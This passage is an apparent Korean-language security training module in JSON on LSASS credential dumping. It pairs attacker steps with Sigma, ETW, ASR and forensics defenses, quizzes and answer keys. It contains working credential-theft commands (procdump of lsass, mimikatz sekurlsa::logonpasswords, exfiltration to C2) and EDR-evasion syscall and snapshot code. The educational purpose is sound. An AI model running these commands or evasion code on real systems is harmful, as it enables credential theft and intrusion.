+          "description": "공격자의 ProcDump 기반 LSASS 덤프 과정을 단계별로 따라가 보세요.",
+          "steps": [
+            { "emoji": "1️⃣", "label": "관리자 권한 CMD 실행", "detail": "공격자는 먼저 관리자 권한의 명령 프롬프트를 확보합니다. 이를 위해 UAC 우회 또는 권한 상승 취약점을 사용합니다." },
+            { "emoji": "2️⃣", "label": "ProcDump 다운로드/전송", "detail": "Microsoft Sysinternals에서 ProcDump를 다운로드하거나, 이미 시스템에 있는 경우 그대로 사용합니다. 합법적 도구이므로 AV 탐지를 회피합니다." },
+            { "emoji": "3️⃣", "label": "LSASS PID 확인", "detail": "tasklist /FI \"IMAGENAME eq lsass.exe\" 명령으로 LSASS 프로세스 ID를 확인합니다." },
+            { "emoji": "4️⃣", "label": "메모리 덤프 실행", "detail": "procdump.exe -ma <PID> lsass.dmp -accepteula 명령으로 전체 메모리를 덤프합니다. -ma 옵션은 전체 메모리를 포함합니다." },
+            { "emoji": "5️⃣", "label": "덤프 파일 외부 전송", "detail": "생성된 .dmp 파일을 C2 서버로 전송하거나, USB 드라이브로 복사합니다. 이후 오프라인에서 분석합니다." },
+            { "emoji": "6️⃣", "label": "Mimikatz로 오프라인 분석", "detail": "공격자의 시스템에서 mimikatz 'sekurlsa::minidump lsass.dmp' 'sekurlsa::logonpasswords' 명령으로 자격증명을 추출합니다." }
+          ]
+        },
+        {
+          "type": "code_fill",
+          "title": "Sigma 규칙 빈칸 채우기",
+          "description": "LSASS 접근 탐지 Sigma 규칙의 빈칸을 올바른 값으로 채우세요.",
+          "code": {
+            "filename": "sigma_lsass_fill.yml",
+            "lines": [
+              { "text": "title: LSASS Memory Access Detection", "color": "green" },
+              { "text": "status: production", "color": "cyan" },
+              { "text": "level: high", "color": "red" },
+              { "text": "", "color": "white" },
+              { "text": "logsource:", "color": "yellow" },
+              { "text": "  category: ___blank1___", "color": "cyan" },
+              { "text": "  product: windows", "color": "cyan" },
+              { "text": "", "color": "white" },
+              { "text": "detection:", "color": "yellow" },
+              { "text": "  selection:", "color": "orange" },
+              { "text": "    TargetImage|endswith: '\\___blank2___'", "color": "cyan" },
+              { "text": "    GrantedAccess|contains: '___blank3___'", "color": "cyan" },
+              { "text": "  condition: selection", "color": "yellow" }
+            ]
+          },
+          "blanks": [
+            { "id": "blank1", "answer": "process_access", "hint": "카테고리?", "alternatives": ["ProcessAccess"] },
+            { "id": "blank2", "answer": "lsass.exe", "hint": "프로세스명?", "alternatives": ["LSASS.exe", "LSASS.EXE"] },
+            { "id": "blank3", "answer": "0x1010", "hint": "접근 권한?", "alternatives": ["0x1F0FFF", "0x1410"] }
+          ]
+        }
+      ],
+      "quiz": {
+        "questions": [
+          {
+            "question": "Mimikatz가 LSASS에서 자격증명을 추출할 때 사용하는 핵심 Windows API 조합은?",
+            "options": [
+              "CreateFile + WriteFile",
+              "OpenProcess + ReadProcessMemory",
+              "RegOpenKey + RegQueryValue",
+              "socket + connect + send"
+            ],
+            "correct": 1,
+            "explanation": "Mimikatz는 OpenProcess()로 LSASS 프로세스 핸들을 획득한 후, ReadProcessMemory()로 메모리를 읽어 인증 구조체를 파싱합니다. PROCESS_VM_READ 권한이 필수입니다."
+          },
+          {
+            "question": "comsvcs.dll을 이용한 LSASS 덤프가 탐지하기 어려운 이유는?",
+            "options": [
+              "암호화된 통신을 사용하기 때문",
+              "Windows에 기본 포함된 합법적 DLL이므로",
+              "커널 모드에서 실행되기 때문",
+              "네트워크 트래픽이 없기 때문"
+            ],
+            "correct": 1,
+            "explanation": "comsvcs.dll은 Windows에 기본 포함된 합법적 DLL로, rundll32.exe를 통해 MiniDump 기능을 호출합니다. 서명된 Microsoft 파일이므로 대부분의 AV/EDR이 기본 상태에서 차단하지 않습니다."
+          },
+          {
+            "question": "Sysmon Event ID 10에서 LSASS 접근을 탐지할 때 확인해야 할 핵심 필드는?",
+            "options": [
+              "SourceImage + TargetImage + GrantedAccess",
+              "ProcessId + ParentProcessId",
+              "DestinationPort + SourcePort",
+              "RuleName + EventType"
+            ],
+            "correct": 0,
+            "explanation": "Event ID 10(ProcessAccess)에서 SourceImage(접근한 프로세스), TargetImage(lsass.exe), GrantedAccess(요청한 권한)를 조합하여 비정상적 접근을 탐지합니다."
+          },
+          {
+            "question": "Direct Syscall 기법이 일반적인 API 모니터링을 우회할 수 있는 이유는?",
+            "options": [
+              "ntdll.dll을 거치지 않고 커널을 직접 호출하기 때문",
+              "네트워크를 통해 원격으로 실행하기 때문",
+              "관리자 권한이 필요 없기 때문",
+              "메모리에 접근하지 않기 때문"
+            ],
+            "correct": 0,
+            "explanation": "일반적으로 API 모니터링 도구(EDR)는 ntdll.dll의 함수를 후킹합니다. Direct Syscall은 ntdll.dll을 우회하여 시스템 콜 번호로 커널을 직접 호출하므로 이러한 후킹을 회피합니다."
+          },
+          {
+            "question": "YARA 규칙에서 Mimikatz를 탐지할 때 파일명 변경 우회를 방지하는 방법은?",
+            "options": [
+              "파일명만으로 탐지",
+              "파일 크기로 탐지",
+              "바이너리 내부의 고유 문자열 패턴으로 탐지",
+              "실행 시간으로 탐지"
+            ],
+            "correct": 2,
+            "explanation": "YARA 규칙은 파일 내부의 고유 문자열(예: 'sekurlsa::logonpasswords', 'gentilkiwi')이나 바이너리 패턴을 매칭합니다. 파일명을 변경해도 내부 코드는 동일하므로 여전히 탐지됩니다."
+          }
+        ]
+      }
+    },
+    "advanced": {
+      "title": "LSASS 덤프 심화: 커스텀 구현과 우회 분석",
+      "titleEn": "Advanced LSASS Dumping: Custom Implementation & Evasion",
+      "estimatedMinutes": 50,
+      "overviewPanel": {
+        "emoji": "⚡",
+        "question": "EDR을 우회하는 최신 LSASS 덤프 기법과 그 방어법은?",
+        "explanation": "고급 과정에서는 Direct Syscall, NTFS 트랜잭션, 프로세스 스냅샷 등 최신 우회 기법의 원리를 코드 수준에서 분석하고, Credential Guard 내부 구조와 커널 레벨 탐지 방법을 학습합니다.",
+        "learningGoals": [
+          { "emoji": "🔬", "title": "커스텀 덤퍼 구현 분석", "desc": "Direct Syscall 기반 LSASS 덤퍼의 코드를 심층 분석합니다" },
+          { "emoji": "🛡️", "title": "Credential Guard 내부 구조", "desc": "VBS 격리 환경에서의 자격증명 보호 메커니즘을 이해합니다" },
+          { "emoji": "📊", "title": "커널 레벨 탐지", "desc": "ETW 기반 커널 이벤트 모니터링으로 고급 우회를 탐지합니다" }
+        ]
+      },
+      "chapters": [
+        {
+          "id": "ch1",
+          "title": "Direct Syscall 기반 LSASS 덤프",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Syscall과 EDR 우회 원리",
+              "emojis": "🔩",
+              "content": "Windows 사용자 모드 API(ntdll.dll)는 Syscall Stub를 통해 커널로 전환합니다. EDR은 ntdll.dll의 함수를 후킹하여 모든 API 호출을 감시합니다. Direct Syscall은 ntdll.dll을 우회하여 어셈블리 코드로 시스템 콜을 직접 수행합니다. 이로 인해 사용자 모드 후킹을 완전히 회피할 수 있습니다."
+            },
+            {
+              "type": "code",
+              "heading": "Direct Syscall: NtOpenProcess 구현",
+              "filename": "direct_syscall.asm",
+              "language": "x86-64 Assembly",
+              "warning": "어셈블리 코드 분석 — 교육 목적",
+              "lines": [
+                { "text": "; Direct Syscall for NtOpenProcess (x64)", "color": "slate" },
+                { "text": "; EDR이 ntdll.dll을 후킹해도 이 코드는 감지되지 않음", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "NtOpenProcess PROC", "color": "cyan" },
+                { "text": "    mov r10, rcx           ; 첫 번째 인자를 r10에 보관", "color": "green" },
+                { "text": "    mov eax, 26h           ; NtOpenProcess syscall 번호 (Win 10)", "color": "red" },
+                { "text": "    syscall                 ; 커널 직접 호출!", "color": "red" },
+                { "text": "    ret                     ; ntdll.dll 완전 우회", "color": "green" },
+                { "text": "NtOpenProcess ENDP", "color": "cyan" },
+                { "text": "", "color": "white" },
+                { "text": "; NtReadVirtualMemory도 동일 패턴으로 구현", "color": "slate" },
+                { "text": "NtReadVirtualMemory PROC", "color": "cyan" },
+                { "text": "    mov r10, rcx", "color": "green" },
+                { "text": "    mov eax, 3Fh           ; NtReadVirtualMemory 번호", "color": "red" },
+                { "text": "    syscall", "color": "red" },
+                { "text": "    ret", "color": "green" },
+                { "text": "NtReadVirtualMemory ENDP", "color": "cyan" }
+              ]
+            },
+            {
+              "type": "warning",
+              "heading": "Syscall 번호는 OS 버전마다 다름",
+              "content": "Windows의 Syscall 번호는 빌드 버전마다 변경됩니다. 공격 도구는 런타임에 ntdll.dll에서 올바른 Syscall 번호를 동적으로 추출하거나, 버전별 테이블을 내장합니다. 이는 '무기화'의 중요한 단계입니다."
+            }
+          ]
+        },
+        {
+          "id": "ch2",
+          "title": "프로세스 스냅샷 기법 (PssCaptureSnapshot)",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "스냅샷 기반 우회",
+              "emojis": "📸",
+              "content": "PssCaptureSnapshot API는 프로세스의 메모리 스냅샷을 생성합니다. 이 방법은 LSASS 프로세스에 직접 접근하지 않고 스냅샷을 통해 간접적으로 메모리를 읽으므로, 일부 EDR의 ProcessAccess 이벤트 감지를 우회할 수 있습니다."
+            },
+            {
+              "type": "code",
+              "heading": "PssCaptureSnapshot 기반 덤프",
+              "filename": "snapshot_dump.c",
+              "language": "C",
+              "warning": "고급 우회 기법 분석 — 허가된 환경에서만 실행",
+              "lines": [
+                { "text": "#include <windows.h>", "color": "green" },
+                { "text": "#include <processsnapshot.h>", "color": "green" },
+                { "text": "#include <dbghelp.h>", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "// 1단계: LSASS 프로세스 핸들 획득", "color": "slate" },
+                { "text": "HANDLE hProcess = OpenProcess(", "color": "cyan" },
+                { "text": "    PROCESS_ALL_ACCESS, FALSE, lsassPid);", "color": "yellow" },
+                { "text": "", "color": "white" },
+                { "text": "// 2단계: 프로세스 스냅샷 캡처", "color": "slate" },
+                { "text": "HPSS hSnapshot;", "color": "cyan" },
+                { "text": "DWORD flags = PSS_CAPTURE_VA_CLONE", "color": "red" },
+                { "text": "    | PSS_CAPTURE_HANDLES", "color": "red" },
+                { "text": "    | PSS_CAPTURE_HANDLE_TRACE;", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "PssCaptureSnapshot(hProcess, flags, 0, &hSnapshot);", "color": "red" },
+                { "text": "", "color": "white" },
+                { "text": "// 3단계: 스냅샷에서 MiniDump 생성", "color": "slate" },
+                { "text": "// 이 시점에서 원본 LSASS에 직접 접근하지 않음!", "color": "orange" },
+                { "text": "MiniDumpWriteDump(", "color": "red" },
+                { "text": "    hSnapshot, lsassPid, hFile,", "color": "red" },
+                { "text": "    MiniDumpWithFullMemory,", "color": "orange" },
+                { "text": "    NULL, NULL,", "color": "red" },
+                { "text": "    &callbackInfo  // 스냅샷용 콜백", "color": "purple" },
+                { "text": ");", "color": "red" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch3",
+          "title": "Credential Guard 내부 구조",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "VBS (Virtualization-Based Security) 아키텍처",
+              "emojis": "🏗️",
+              "content": "Credential Guard는 Hyper-V 하이퍼바이저를 이용하여 LSASS의 자격증명 처리를 격리된 가상 환경(Isolated LSA, LSAIso)에서 수행합니다. 관리자 권한을 가진 공격자라 하더라도, VTL 0(일반 OS)에서 VTL 1(격리 환경)의 메모리에 접근할 수 없습니다."
+            },
+            {
+              "type": "diagram",
+              "heading": "Credential Guard 격리 아키텍처",
+              "ascii": "  ┌───────────── Hyper-V Hypervisor ─────────────┐\n  │                                                │\n  │  ┌─── VTL 0 (Normal) ───┐  ┌── VTL 1 (Secure) ─┐  │\n  │  │                       │  │                     │  │\n  │  │  Windows OS           │  │  Isolated LSA       │  │\n  │  │  ┌──────────┐         │  │  (LSAIso.exe)       │  │\n  │  │  │ LSASS    │─ RPC ──→│  │  ┌──────────────┐  │  │\n  │  │  │ (proxy)  │         │  │  │ 자격증명 보관 │  │  │\n  │  │  └──────────┘         │  │  │ NTLM 해시     │  │  │\n  │  │  ┌──────────┐         │  │  │ Kerberos 키   │  │  │\n  │  │  │ 공격자   │  ✘ ───→│  │  └──────────────┘  │  │\n  │  │  │ (admin)  │  접근   │  │                     │  │\n  │  │  └──────────┘  불가!  │  │  ※ VTL 0에서      │  │\n  │  │                       │  │    접근 불가        │  │\n  │  └───────────────────────┘  └─────────────────────┘  │\n  └────────────────────────────────────────────────────┘"
+            },
+            {
+              "type": "info",
+              "heading": "Credential Guard 활성화 확인",
+              "emojis": "✅",
+              "content": "Credential Guard 상태 확인 방법: ① msinfo32.exe → '가상화 기반 보안' 항목. ② PowerShell: Get-CimInstance -ClassName Win32_DeviceGuard. ③ 이벤트 로그: Application and Services Logs → Microsoft → Windows → DeviceGuard → Operational."
+            }
+          ]
+        },
+        {
+          "id": "ch4",
+          "title": "ETW 기반 커널 레벨 탐지",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "ETW (Event Tracing for Windows)",
+              "emojis": "📡",
+              "content": "ETW는 Windows 커널에 내장된 이벤트 추적 인프라입니다. 사용자 모드 후킹을 우회하는 Direct Syscall도 커널에서는 ETW 이벤트를 발생시킵니다. Microsoft-Windows-Threat-Intelligence ETW 프로바이더는 커널 레벨에서 프로세스 메모리 접근을 추적합니다."
+            },
+            {
+              "type": "code",
+              "heading": "ETW Threat Intelligence Provider 활용",
+              "filename": "etw_monitor.ps1",
+              "language": "powershell",
+              "warning": "탐지 도구 코드 — 방어 목적",
+              "lines": [
+                { "text": "# ETW Threat Intelligence Provider 세션 생성", "color": "slate" },
+                { "text": "# 커널 레벨에서 LSASS 메모리 접근 탐지", "color": "slate" },
+                { "text": "", "color": "white" },
+                { "text": "$sessionName = 'LsassGuard'", "color": "cyan" },
+                { "text": "$providerGuid = [Guid]'F4E1897C-BB5D-5668-F1D8-040F4D8DD344'", "color": "purple" },
+                { "text": "", "color": "white" },
+                { "text": "# ETW 세션 시작", "color": "green" },
+                { "text": "New-EtwTraceSession -Name $sessionName `", "color": "cyan" },
+                { "text": "    -LogFileMode 'RealTime' `", "color": "yellow" },
+                { "text": "    -FlushTimer 1", "color": "yellow" },
+                { "text": "", "color": "white" },
+                { "text": "# Threat Intelligence Provider 추가", "color": "green" },
+                { "text": "Add-EtwTraceProvider -SessionName $sessionName `", "color": "cyan" },
+                { "text": "    -Guid $providerGuid `", "color": "purple" },
+                { "text": "    -Level 5 `  # Verbose", "color": "yellow" },
+                { "text": "    -MatchAnyKeyword 0xFFFFFFFF", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# 이벤트 실시간 소비", "color": "green" },
+                { "text": "Get-EtwTraceSession -Name $sessionName |", "color": "cyan" },
+                { "text": "  Receive-EtwEvent | Where-Object {", "color": "cyan" },
+                { "text": "    $_.TargetProcessId -eq (Get-Process lsass).Id", "color": "red" },
+                { "text": "  } | ForEach-Object {", "color": "cyan" },
+                { "text": "    Write-Warning \"[ALERT] LSASS Access: $($_.SourceProcessName)\"", "color": "red" },
+                { "text": "  }", "color": "cyan" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch5",
+          "title": "PPL 보호 우회와 드라이버 취약점",
+          "panels": [
+            {
+              "type": "warning",
+              "heading": "PPL 우회는 커널 취약점을 요구함",
+              "content": "Protected Process Light(PPL)로 보호된 LSASS를 우회하려면 서명된 드라이버의 취약점을 악용해야 합니다. 이는 BYOVD(Bring Your Own Vulnerable Driver) 공격으로 알려져 있으며, 커널 수준의 권한이 필요하므로 공격 난이도가 매우 높습니다."
+            },
+            {
+              "type": "concept",
+              "heading": "BYOVD (Bring Your Own Vulnerable Driver)",
+              "emojis": "🚗💥",
+              "content": "공격자는 합법적이지만 취약한 서명된 드라이버를 로드하여 커널 모드 코드 실행을 달성합니다. 예: RTCore64.sys(MSI Afterburner), dbutil_2_3.sys(Dell). 커널 모드에서 PPL 보호 플래그를 제거하면 LSASS에 자유롭게 접근할 수 있습니다."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "알려진 취약 드라이버 사례",
+              "headers": ["드라이버", "소프트웨어", "CVE", "악용 APT"],
+              "rows": [
+                ["RTCore64.sys", "MSI Afterburner", "CVE-2019-16098", "BlackByte"],
+                ["dbutil_2_3.sys", "Dell BIOS Utility", "CVE-2021-21551", "Lazarus"],
+                ["ene.sys", "ENE Technology", "CVE-2020-12928", "AvosLocker"],
+                ["gdrv.sys", "GIGABYTE", "CVE-2018-19320", "RobbinHood"]
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch6",
+          "title": "방어 강화: ASR 규칙과 WDAC",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "Attack Surface Reduction(ASR) 규칙",
+              "emojis": "🛡️",
+              "content": "Microsoft Defender의 ASR 규칙 중 'Block credential stealing from the Windows local security authority subsystem (lsass.exe)' (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2)는 LSASS에 대한 의심스러운 접근을 차단합니다. GPO 또는 Intune으로 배포할 수 있습니다."
+            },
+            {
+              "type": "code",
+              "heading": "ASR 규칙 + WDAC 정책 설정",
+              "filename": "defense_config.ps1",
+              "language": "powershell",
+              "warning": "방어 설정 스크립트 — 실제 환경에서 테스트 후 적용",
+              "lines": [
+                { "text": "# ASR 규칙: LSASS 자격증명 도용 차단", "color": "slate" },
+                { "text": "Set-MpPreference -AttackSurfaceReductionRules_Ids `", "color": "cyan" },
+                { "text": "    '9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2' `", "color": "purple" },
+                { "text": "    -AttackSurfaceReductionRules_Actions Enabled", "color": "green" },
+                { "text": "", "color": "white" },
+                { "text": "# PPL 활성화 (레지스트리)", "color": "slate" },
+                { "text": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' `", "color": "cyan" },
+                { "text": "    -Name 'RunAsPPL' -Value 1 -Type DWord", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# WDigest 평문 비밀번호 저장 비활성화", "color": "slate" },
+                { "text": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' `", "color": "cyan" },
+                { "text": "    -Name 'UseLogonCredential' -Value 0 -Type DWord", "color": "orange" },
+                { "text": "", "color": "white" },
+                { "text": "# WDAC: 취약 드라이버 차단 정책", "color": "slate" },
+                { "text": "# Microsoft 권장 드라이버 차단 목록 적용", "color": "green" },
+                { "text": "# https://learn.microsoft.com/windows/security/threat-protection/", "color": "green" },
+                { "text": "Copy-Item -Path '.\\SiPolicy.p7b' `", "color": "cyan" },
+                { "text": "    -Destination 'C:\\Windows\\System32\\CodeIntegrity\\'", "color": "cyan" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "ch7",
+          "title": "포렌식 관점: 사후 분석",
+          "panels": [
+            {
+              "type": "concept",
+              "heading": "LSASS 덤프 사고 대응 절차",
+              "emojis": "🔍",
+              "content": "LSASS 메모리 덤프가 탐지되었을 때의 사고 대응(Incident Response) 절차: ① 즉시 격리 — 해당 시스템의 네트워크 연결 차단. ② 메모리 수집 — 감염 시스템의 전체 RAM 덤프 확보. ③ 아티팩트 분석 — Event Log, Prefetch, MFT 타임라인 분석. ④ 자격증명 리셋 — 탈취 가능성이 있는 모든 계정의 비밀번호 즉시 변경. ⑤ 횡단이동 추적 — 탈취된 자격증명으로 접근한 시스템 식별."
+            },
+            {
+              "type": "comparison_table",
+              "heading": "포렌식 아티팩트 분석 포인트",
+              "headers": ["아티팩트", "위치", "확인 사항"],
+              "rows": [
+                ["Sysmon 로그", "Event ID 10", "SourceImage, GrantedAccess 필드"],
+                ["Prefetch", "C:\\Windows\\Prefetch", "procdump.exe, mimikatz.exe 실행 기록"],
+                ["MFT", "$MFT 파일", ".dmp 파일 생성 시간과 크기"],
+                ["PowerShell 로그", "Event ID 4104", "ScriptBlock에 lsass 관련 명령"],
+                ["Windows Security", "Event ID 4688", "의심 프로세스 생성 기록"]
+              ]
+            }
+          ]
+        }
+      ],
+      "miniLabs": [
+        {
+          "type": "ordering_game",
+          "title": "사고 대응 절차 순서 배열",
+          "description": "LSASS 덤프 침해 탐지 시 올바른 대응 순서로 배열하세요.",
+          "items": [
+            { "label": "SIEM 알림 확인 및 이벤트 분석" },
+            { "label": "감염 시스템 네트워크 격리" },
+            { "label": "메모리 및 디스크 포렌식 이미지 확보" },
+            { "label": "공격 타임라인 재구성" },
+            { "label": "탈취된 자격증명 식별 및 리셋" },
+            { "label": "횡단이동 경로 추적 및 추가 시스템 점검" },
+            { "label": "최종 보고서 작성 및 보안 강화 권고" }
+          ]
+        },
+        {
+          "type": "step_click",
+          "title": "Credential Guard 공격 시뮬레이션",
+          "description": "Credential Guard가 활성화된 환경에서의 공격과 방어를 단계별로 따라가 보세요.",
+          "steps": [
+            { "emoji": "⚔️", "label": "공격자: 관리자 권한 획득", "detail": "공격자가 UAC 우회를 통해 로컬 관리자 권한을 확보합니다. 하지만 이것만으로는 Credential Guard를 우회할 수 없습니다." },
+            { "emoji": "🔑", "label": "공격자: Mimikatz 실행 시도", "detail": "sekurlsa::logonpasswords를 실행하지만, Credential Guard로 인해 NTLM 해시와 Kerberos 키가 '(null)' 또는 빈 값으로 표시됩니다." },
+            { "emoji": "🚗", "label": "공격자: BYOVD 시도", "detail": "취약한 서명 드라이버(예: RTCore64.sys)를 로드하여 커널 모드 접근을 시도합니다. 하지만 HVCI(Hypervisor-Enforced Code Integrity)가 이를 차단합니다." },
+            { "emoji": "🛡️", "label": "방어: ASR + WDAC 차단", "detail": "ASR 규칙이 LSASS 접근을 차단하고, WDAC 정책이 취약 드라이버 로딩을 방지합니다. ETW 이벤트가 SIEM으로 전송됩니다." },
+            { "emoji": "🚨", "label": "탐지: SOC 알림 발생", "detail": "Sigma 규칙이 비정상 LSASS 접근 패턴을 탐지하고, SOAR 플레이북이 자동으로 시스템을 격리합니다." }
+          ]
+        },
+        {
+          "type": "matching_game",
+          "title": "고급 우회 기법과 탐지 방법 매칭",
+          "description": "각 우회 기법에 대한 올바른 탐지/방어 방법을 선택하세요.",
+          "pairs": [
+            { "left": "Direct Syscall로 ntdll.dll 후킹 우회", "right": "ETW Threat Intelligence" },
+            { "left": "PssCaptureSnapshot으로 간접 메모리 접근", "right": "핸들 생성 이벤트 감시" },
+            { "left": "BYOVD로 PPL 보호 제거", "right": "WDAC 드라이버 차단 목록" },
+            { "left": "파일리스 덤프 (디스크 미접근)", "right": "메모리 포렌식" },
+            { "left": "도구명/해시 변경", "right": "YARA 행동 기반 탐지" }
+          ]
+        }
+      ],
+      "quiz": {
+        "questions": [
+          {
+            "question": "Direct Syscall이 ntdll.dll 후킹을 우회할 수 있는 근본적 이유는?",
+            "options": [
+              "syscall 명령어가 커널로 직접 전환하여 사용자 모드 후킹 지점을 완전히 건너뛰기 때문",
+              "ntdll.dll 자체를 메모리에서 삭제하기 때문",
+              "커널 모드에서 실행되기 때문",
+              "네트워크를 통해 원격으로 실행하기 때문"
+            ],
+            "correct": 0,
+            "explanation": "x64 syscall 명령어는 CPU의 STAR/LSTAR MSR 레지스터를 통해 직접 커널 모드로 전환합니다. ntdll.dll의 Syscall Stub를 거치지 않으므로, EDR이 ntdll.dll에 설치한 인라인 후킹이나 IAT 후킹을 완전히 우회합니다."
+          },
+          {
+            "question": "Credential Guard에서 자격증명이 보호되는 핵심 원리는?",
+            "options": [
+              "자격증명을 디스크에 암호화하여 저장",
+              "VTL 1 격리 환경(LSAIso)에서 자격증명을 처리하여 VTL 0에서 접근 불가",
+              "네트워크 연결을 차단하여 외부 전송 방지",
+              "자격증명을 30분마다 자동 갱신"
+            ],
+            "correct": 1,
+            "explanation": "Credential Guard는 Hyper-V 하이퍼바이저의 VTL(Virtual Trust Level) 격리를 사용합니다. 자격증명 처리는 VTL 1의 LSAIso.exe에서 수행되며, VTL 0의 어떤 프로세스도(관리자 포함) VTL 1 메모리에 접근할 수 없습니다."
+          },
+          {
+            "question": "BYOVD 공격에서 공격자가 취약한 드라이버를 사용하는 이유는?",
+            "options": [
+              "드라이버는 네트워크 통신이 빠르기 때문",
+              "서명된 드라이버만 Windows 커널에 로드할 수 있으므로, 취약한 서명 드라이버로 커널 접근을 달성",
+              "드라이버는 안티바이러스 스캔 대상이 아니기 때문",
+              "드라이버는 리부팅 후에도 유지되기 때문"
+            ],
+            "correct": 1,
+            "explanation": "Windows는 KMCS(Kernel Mode Code Signing) 정책으로 서명된 드라이버만 커널에 로드합니다. 공격자는 합법적으로 서명되었지만 취약점이 있는 드라이버를 이용해 커널 모드 코드 실행을 달성하고, PPL 보호를 비활성화합니다."
+          },
+          {
+            "question": "ETW Threat Intelligence Provider가 Direct Syscall도 탐지할 수 있는 이유는?",
+            "options": [
+              "ETW가 네트워크 트래픽을 모니터링하기 때문",
+              "ETW가 디스크 I/O를 감시하기 때문",
+              "ETW 이벤트가 커널 내부에서 발생하므로 사용자 모드 우회와 무관",
+              "ETW가 ntdll.dll을 보호하기 때문"
+            ],
+            "correct": 2,
+            "explanation": "ETW Threat Intelligence Provider는 Windows 커널 내부에 내장되어 있습니다. syscall이 커널에 도착하면 커널 내부의 ETW 콜백이 작동하므로, 사용자 모드에서 ntdll.dll을 우회하더라도 커널 레벨의 ETW 이벤트는 정상적으로 발생합니다."
+          },
+          {
+            "question": "LSASS 덤프 침해 대응 시 가장 우선적으로 해야 할 조치는?",
+            "options": [
+              "포렌식 이미지 확보",
+              "보고서 작성",
+              "네트워크 격리 및 자격증명 리셋",
+              "패치 적용"
+            ],
+            "correct": 2,
+            "explanation": "자격증명이 탈취된 경우, 공격자가 즉시 횡단이동(Lateral Movement)에 사용할 수 있으므로 네트워크 격리와 탈취 가능한 모든 자격증명의 즉시 리셋이 최우선입니다. 포렌식은 격리 후 수행합니다."
+          }
+        ]
+      }
+    }
+  },
+  "metadata": {
+    "ctiSources": [
+      { "name": "MITRE ATT&CK", "url": "https://attack.mitre.org/techniques/T1003/001/", "description": "T1003.001 기법 정의 및 Procedure Examples" },
+      { "name": "MITRE CTI GitHub", "url": "https://github.com/mitre/cti", "description": "STIX 2.1 JSON 데이터 — 탐지 방법 및 완화 전략" },
+      { "name": "CISA Advisory", "url": "https://www.cisa.gov/", "description": "LSASS 관련 보안 권고 및 방어 가이드라인" },
+      { "name": "Kaspersky Securelist", "url": "https://securelist.com/", "description": "APT 그룹의 LSASS 덤프 기법 분석 보고서" }
+    ],
+    "aptGroups": ["APT29", "APT28", "Lazarus Group", "FIN7", "BlackByte"],
+    "relatedTechniques": ["T1003.002", "T1003.003", "T1558.001", "T1550.002"],
+    "tags": ["credential-dumping", "lsass", "mimikatz", "windows", "credential-guard", "ppl", "sysmon", "sigma"],
+    "lastUpdated": "2026-03-02",
+    "author": "GOTROOT Education Team",
+    "version": "1.0.0"
+  }
+}
